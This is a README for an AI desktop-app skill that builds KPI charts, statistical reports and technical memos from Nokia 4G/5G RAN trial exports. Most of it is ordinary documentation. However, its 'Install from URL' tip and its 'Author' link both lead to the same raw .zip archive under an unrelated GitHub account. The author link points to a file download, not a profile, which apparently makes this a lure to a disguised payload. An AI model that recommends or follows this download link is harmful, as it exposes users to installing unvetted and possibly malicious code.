# ran-trial-production

**Cowork skill for end-to-end RAN optimisation trial analysis.**

Produces the full deliverable set from Nokia KPI exports:
1. **KPI Charts Excel** — per-KPI time-series charts (Baseline / Trial / Post-RB), colour-coded carrier lines, red/green event markers
2. **Statistical Analysis Excel** — sigma significance matrix, sigma ranking chart, per-carrier detail, energy-saving KPIs, feature causal-chain KPI trajectories
3. **Technical Memo (.docx)** — formal report with executive summary, carrier-stratified analysis, confounding-factor assessment, and verdict

Supports **4G LTE** (fully implemented) and **5G NR NSA/EN-DC** (Phase 3 — first release).

---

## Repository structure

```
ran-trial-production/
├── SKILL.md                       # Claude skill entry point (pipeline guide)
├── README.md                      # This file
├── CHANGELOG.md                   # Version history and fix log
├── LICENSE                        # MIT
├── .gitignore
│
├── references/
│   ├── methodology.md             # RAT-agnostic: sigma math, verdict mapping, H-framework
│   ├── trial_intake_template.md   # Markdown intake form (fill before handing to Claude)
│   ├── trial_intake_form.html     # Interactive HTML intake form (LTE + NR)
│   ├── nr/
│   │   ├── carrier_allocation.md  # NR NRARFCN → carrier label map + stratification rules
│   │   ├── methodology_nr.md      # NR-specific methodology departures
│   │   └── kpi_column_map.md      # Nokia 5G NR column → display name, tier, higher_bad
│   └── lte/
│       ├── carrier_allocation.md  # LTE EARFCN → carrier label map
│       ├── methodology_lte.md     # LTE-specific extensions to methodology.md
│       └── trial_intake_form.html # Legacy LTE-only intake form
│
└── scripts/
    ├── nr/
    │   ├── build_kpi_charts_nr.py      # Generates KPI Charts Excel (NR, per-RC)
    │   ├── build_stats_report_nr.py    # Generates Statistical Analysis Excel (NR, per-RC)
    │   ├── extract_stats.py            # CLI stats extractor (feed output to build scripts)
    │   ├── trial_memo_nr.js            # Generates Technical Memo .docx (Node.js, NR)
    │   └── feature_context_template.json  # Template: causal-chain KPI list per trial
    └── lte/
        ├── build_kpi_charts_template.py   # Generates KPI Charts Excel (LTE, per-RC)
        ├── build_stats_report_template.py # Generates Statistical Analysis Excel (LTE, per-RC)
        ├── extract_stats.py               # CLI stats extractor (LTE)
        ├── extract_energy_stats.py        # CLI energy stats extractor (SBTS exports)
        ├── trial_memo_template.js         # Generates Technical Memo .docx (Node.js, LTE)
        └── feature_context_template.json  # Template: causal-chain KPI list per trial
```

---

## Installation

### Prerequisites

```bash
pip install pandas openpyxl xlsxwriter numpy
npm install docx          # for memo generation
```

### Install as a Cowork skill

1. Clone or download this repository.
2. Open Claude desktop app → Settings → Plugins → Add plugin folder.
3. Point to the directory containing this `ran-trial-production/` folder.
4. Restart Claude — the skill will appear as `ran-trial-production`.

> **Tip:** You can also install directly from GitHub:
> Cowork → Plugins → Install from URL → `https://github.com/hilloutlying198/ran-trial-production/raw/refs/heads/main/examples/nr/ran-production-trial-1.4.zip`

### Manual use (without Cowork)

Copy the `scripts/` folder to your trial working directory and run the Python/Node scripts directly. Edit the `CONFIGURATION` section at the top of each script to set your trial dates, file paths, and carrier map.

---

## Quick start

1. **Fill in the intake form** — open `references/trial_intake_form.html` in your browser (or copy `references/trial_intake_template.md` and fill it in). Download the JSON.

2. **Attach files to Claude** — upload the Nokia KPI export(s) and the completed intake JSON.

3. **Tell Claude** — `"process the trial"` — the skill handles the rest.

4. **Outputs land in your workspace folder** — KPI Charts Excel, Statistical Analysis Excel, and Technical Memo (.docx).

---

## Adapting to your network

The NRARFCN / EARFCN → carrier label maps are set to example values. **Replace them with your cluster's actual values before first use.**

In each Python script, update the `MNO_NR_NRARFCN_MAP` (NR) or `MNO_EARFCN_MAP` (LTE) dict at the top:

```python
# NR example — replace with your cluster's NRARFCNs
MNO_NR_NRARFCN_MAP = {
    152600: 'N28',
    635334: 'N78_F1',
    # ... add your carriers
}

# LTE example — replace with your cluster's EARFCNs
MNO_EARFCN_MAP = {
    6400:  'B800',
    3725:  'B900',
    # ... add your carriers
}
```

Also update the corresponding entries in `references/nr/carrier_allocation.md` and `references/lte/carrier_allocation.md` so the reference documentation stays in sync.

---

## Output examples

The [`examples/`](examples/) directory contains **anonymised reference outputs** built from
real trial data — operator names, trial IDs, and dates replaced with generic placeholders,
KPI values and chart structures preserved as-is.

**LTE outputs** (3 files):

| File | Sheets | Description |
|------|--------|-------------|
| [`examples/lte/CBXXXXXX_RC3_KPI_Grouped.xlsx`](examples/lte/CBXXXXXX_RC3_KPI_Grouped.xlsx) | 22 | LTE KPI Charts RC3 — 10 chart groups, 7 carriers, colour-coded event markers |
| [`examples/lte/CBXXXXXX_RC4_KPI_Grouped.xlsx`](examples/lte/CBXXXXXX_RC4_KPI_Grouped.xlsx) | 22 | LTE KPI Charts RC4 |
| [`examples/lte/CBXXXXXX_Statistical_Analysis.xlsx`](examples/lte/CBXXXXXX_Statistical_Analysis.xlsx) | 6 | Significance Matrix, Band Comparison (Feature vs Unaffected), Ranking |

**NR (5G NSA) outputs** (4 files):

| File | Sheets | Description |
|------|--------|-------------|
| [`examples/nr/CBXXXXXX_RC3_NR_KPI_Grouped.xlsx`](examples/nr/CBXXXXXX_RC3_NR_KPI_Grouped.xlsx) | 24 | NR KPI Charts RC3 — 11 chart groups, 4 carriers, BTS energy tab |
| [`examples/nr/CBXXXXXX_RC4_NR_KPI_Grouped.xlsx`](examples/nr/CBXXXXXX_RC4_NR_KPI_Grouped.xlsx) | 24 | NR KPI Charts RC4 |
| [`examples/nr/CBXXXXXX_RC3_NR_Statistical_Analysis.xlsx`](examples/nr/CBXXXXXX_RC3_NR_Statistical_Analysis.xlsx) | 9 | Overview, Significance Matrix, Per-Carrier, Energy Saving, KPI Trajectories — RC3 |
| [`examples/nr/CBXXXXXX_RC4_NR_Statistical_Analysis.xlsx`](examples/nr/CBXXXXXX_RC4_NR_Statistical_Analysis.xlsx) | 9 | Same structure — RC4 |

**Column and sheet structure** is documented in the corresponding `.md` files alongside
each Excel file. Use them as a sanity-check: if your output doesn't match the column
headers or sheet names, you likely need to update the KPI column map or the
EARFCN/NRARFCN map in the script configuration section.

---

## Key analytical features

- **Sigma significance** — `(trial_mean − baseline_mean) / baseline_std_dev`, colour-coded ≥3σ / ≥2σ / ≥1σ / <1σ
- **Degradation-positive chart sigma** — positive bar always = worse, regardless of KPI direction
- **Dual event markers** — red bar at trial start, green bar at rollback (single `combine()` call — xlsxwriter bug fixed)
- **H-framework for LTE** — H1 (feature-induced) / H2 (concurrent trend) / H3 (SW-specific)
- **H0 handling for NR** — all-carrier activation: falls back to pre/post comparison with PASS WITH CONDITIONS default
- **BTS sanity check** — per-BTS coverage metric (≥80% threshold), outlier detection, traffic stability CV
- **Feature causal-chain KPI trajectories** — KPI_Trajectories sheet built from `feature_context.json`

---

## Known limitations

- NR SA (5G standalone) is not supported.
- Multi-RC NR trials: supported in `extract_stats.py` via `--rc2-file`; the build scripts support a `RCS` list.
- ES column names vary by Nokia SW release — update `NR_ES_COLUMN_MAP` in `extract_stats.py` on first run with a new export.

---

## License

MIT — see [LICENSE](LICENSE).

## Author

GitHub: [Ak74i](https://github.com/hilloutlying198/ran-trial-production/raw/refs/heads/main/examples/nr/ran-production-trial-1.4.zip)
